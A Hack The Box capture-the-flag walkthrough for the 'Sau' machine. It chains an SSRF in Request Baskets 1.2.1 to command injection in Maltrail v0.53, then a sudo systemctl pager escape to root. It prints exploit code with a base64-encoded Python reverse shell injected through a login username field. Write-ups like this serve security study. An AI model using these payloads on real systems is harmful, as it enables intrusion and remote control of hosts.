---
icon: ubuntu
---

# Sau - Easy

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/sau"><strong>Sau</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP scan" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.229.26 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 15:39 -0500
Nmap scan report for 10.129.229.26
Host is up (0.037s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     http    Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 20 Jan 2026 20:39:30 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Tue, 20 Jan 2026 20:39:14 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Tue, 20 Jan 2026 20:39:14 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
| http-title: Request Baskets
|_Requested resource was /web
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.98%I=7%D=1/20%Time=696FE7F7%P=x86_64-pc-linux-gnu%r(G
```
{% endcode %}

Nmap Reveals 2 filtered ports (80 & 8338) and an HTTP server running GOlang

### <mark style="color:blue;">HTTP Port 55555 TCP</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

```shellscript
curl -i http://10.129.229.26:55555/web
```

```shellscript
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Tue, 20 Jan 2026 21:18:12 GMT
Transfer-Encoding: chunked
```

The HTTP response headers don't say much, the nmap scan did say the website was coded in GO

#### <mark style="color:$primary;">Directory Busting</mark>

```shellscript
feroxbuster -u http://10.129.229.26:55555
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Again nothing that catches our eye yet

#### <mark style="color:$primary;">Site</mark>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The footer of the home page reveals a version for the software

### <mark style="color:blue;">SSRF -> Requests-baskets Ver 1.2.1</mark>

A quick google search brings me to this article that reveals an SSRF in this version

{% embed url="https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7" %}

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Exploitation</mark>

I Found a POC on Github

{% embed url="https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh" %}

```shellscript
./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:8338
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It created a basket and gave us a URL we can visit&#x20;

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Visiting the newly created bucket revealed a page that provides us with a version for Maltrail

### <mark style="color:blue;">Maltrail (v0.53) Unauthenticated OS Command Injection</mark>

A quick google search reveals a poc on github for unauthenticated code execution vulnerability in Mailtrail v0.53

{% embed url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}

#### <mark style="color:$primary;">Script Analysis</mark>

This script uses `os.system` in Python to call `curl` to make the request

{% code overflow="wrap" %}
```shellscript
def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)
```
{% endcode %}

It’s a simple POST request to the given url plus `/login`

```shellscript
def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)
```

#### <mark style="color:$primary;">Exploitation</mark>

Clone the repo, prep a listener, than run the command on the SSRF url

```shellscript
python exploit.py 10.10.16.15 443 http://10.129.229.26:55555/ntencd
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We got a shell as the puma user

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as puma</mark>

#### <mark style="color:$primary;">SUDO systemctl → spawns pager (less) → shell escape</mark>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The puma user can run some `systemctl` commands as root without a password using `sudo`

running the command it prints the status of the service

<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

If the screen is not big enough to handle the output of `systemctl`, it gets passed to `less`&#x20;

At the bottom of the terminal there is text and it’s actually hanging. If I enter `!/bin/bash` in `less`, that will run `sh`, and drop to a shell

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
